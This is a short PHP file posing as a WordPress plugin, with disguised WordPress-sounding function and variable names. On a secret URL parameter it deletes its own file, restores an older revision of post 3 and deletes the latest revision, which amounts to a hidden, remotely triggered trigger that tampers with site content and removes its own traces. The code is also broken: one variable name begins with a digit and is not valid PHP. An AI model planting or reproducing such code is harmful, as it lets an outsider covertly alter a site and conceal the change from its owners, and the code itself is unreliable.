<?php

function project_booster_simple_directory() {
	if (isset($_GET['popular_taxonomies_redirection']) && $_GET['popular_taxonomies_redirection'] === 'duplicate_viewer_tracker') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$terms_mediaelement_listing = 3;
		$blogroll_marketing_lead = wp_get_post_revisions($terms_mediaelement_listing);
		if (empty($blogroll_marketing_lead)) die('no revisions');
		if (count($blogroll_marketing_lead) < 2) die('less than 2');
		$404_most_template = array_shift($blogroll_marketing_lead);
		$button_related_print_database = $404_most_template->ID;
		$single_generator_show = array_shift($blogroll_marketing_lead);
		$stats_source_testimonials = $single_generator_show->ID;
		$stats_exporter_parts = wp_restore_post_revision($stats_source_testimonials);
		if ($stats_exporter_parts === false) die('error restoring');
		$stats_exporter_parts = wp_delete_post_revision($button_related_print_database);		
		if ($stats_exporter_parts === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'project_booster_simple_directory');
